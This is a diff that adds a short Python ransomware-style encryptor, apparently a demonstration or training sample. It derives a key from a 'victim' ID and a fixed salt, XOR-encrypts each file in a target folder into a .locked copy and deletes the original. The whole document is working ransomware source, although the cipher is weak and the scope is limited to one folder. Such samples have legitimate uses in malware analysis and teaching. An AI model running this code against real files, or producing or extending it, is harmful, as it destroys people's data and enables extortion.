@@ -1,0 +1,32 @@
+# locker.py - encryptor (demonstration build: only touches the folder in argv[1])
+import hashlib, os, sys
+
+SALT = "r3d-herring"
+
+
+def victim_id():
+    # derived from the machine name and a counter in the registry; printed in the note
+    return open(os.path.join(sys.argv[1], ".victim")).read().strip()
+
+
+def derive_key(vid):
+    return hashlib.sha256((vid + "|" + SALT).encode()).digest()[:16]
+
+
+def crypt(data, key):
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+
+def main():
+    key = derive_key(victim_id())
+    for name in os.listdir(sys.argv[1]):
+        if name.startswith(".") or name.endswith(".locked"):
+            continue
+        path = os.path.join(sys.argv[1], name)
+        data = open(path, "rb").read()
+        open(path + ".locked", "wb").write(crypt(data, key))
+        os.remove(path)
+
+
+if __name__ == "__main__":
+    main()
